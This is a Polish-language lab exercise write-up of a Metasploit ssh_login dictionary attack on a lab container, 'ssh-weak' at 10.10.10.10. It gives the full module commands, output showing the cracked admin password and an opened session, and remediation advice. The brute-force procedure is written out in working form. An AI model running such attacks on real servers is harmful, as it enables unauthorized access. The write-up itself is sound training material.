# Zadanie 4.4 — SSH Bruteforce słabych haseł (`ssh_login`) na `10.10.10.10`

> **Cel:** złamać hasło konta `admin` atakiem słownikowym na SSH i uzyskać
> interaktywną sesję na serwerze (host `.10` — OpenSSH 8.2p1, słabe hasła).

| | |
|---|---|
| **Cel** | `10.10.10.10:22` (OpenSSH 8.2p1, kontener `ssh-weak`) |
| **Moduł** | `auxiliary/scanner/ssh/ssh_login` |
| **Użytkownik** | `admin` (znaleziony w 4.3) |
| **Słownik** | `/usr/src/metasploit-framework/data/wordlists/unix_passwords.txt` |
| **Znalezione** | `admin` / **`654321`** |

## Uruchomienie
```
use auxiliary/scanner/ssh/ssh_login
set RHOSTS 10.10.10.10
set USERNAME admin
set PASS_FILE /usr/src/metasploit-framework/data/wordlists/unix_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
run
```

## Wynik
```
[*] 10.10.10.10:22 - Starting bruteforce
[-] 10.10.10.10:22 - Failed: 'admin:admin'
[-] 10.10.10.10:22 - Failed: 'admin:123456'
[-] 10.10.10.10:22 - Failed: 'admin:password'
...
[+] 10.10.10.10:22 - Success: 'admin:654321' uid=1000(admin) gid=1000(admin)
    groups=1000(admin) Linux ssh-weak 6.5.0-42-generic ... x86_64 GNU/Linux
[*] SSH session 1 opened (10.10.10.5:33915 -> 10.10.10.10:22)
```

![ssh_login → Success admin:654321, sesja otwarta](screeny/01_ssh_login_success.png)

## Wejście do przejętej maszyny
`ssh_login` po trafieniu **sam otwiera sesję**. Interakcja:
```
sessions -l        # lista sesji
sessions -i 1      # wejście do sesji 1
```
W shellu (dowód):
```
id        # uid=1000(admin) gid=1000(admin) groups=1000(admin)
hostname  # ssh-weak
whoami    # admin
```
Powrót do msfconsole bez zabijania sesji: **Ctrl+Z** → `y` (sesja w tle).

![Sesja SSH — id/hostname na ssh-weak](screeny/02_sesja_id.png)

## Na czym polega błąd
Konto `admin` ma **słabe, słownikowe hasło** (`654321`) i serwer nie ma żadnej
ochrony przed brute-force (brak lockoutu/opóźnień/limitu prób). Sama wersja
OpenSSH 8.2p1 jest aktualna — podatny jest **człowiek/konfiguracja**, nie kod.
`STOP_ON_SUCCESS true` zatrzymuje atak po pierwszym trafieniu; `ssh_login` od
razu konwertuje trafienie w działającą sesję.

> `[!] No active DB -- Credential data will not be saved!` to tylko informacja,
> że msf nie ma podłączonej bazy (Postgres) i nie zapisze łupu do `creds` —
> nie wpływa na sam atak.

## Jak naprawić
- Wymusić **silne hasła** + politykę złożoności; zablokować hasła słownikowe.
- **Logowanie kluczem SSH** zamiast hasła (`PasswordAuthentication no`).
- Ochrona brute-force: **fail2ban**, limit prób, opóźnienia, MFA.
- Ograniczyć ekspozycję portu 22 (firewall/VPN/allowlista), `AllowUsers`.
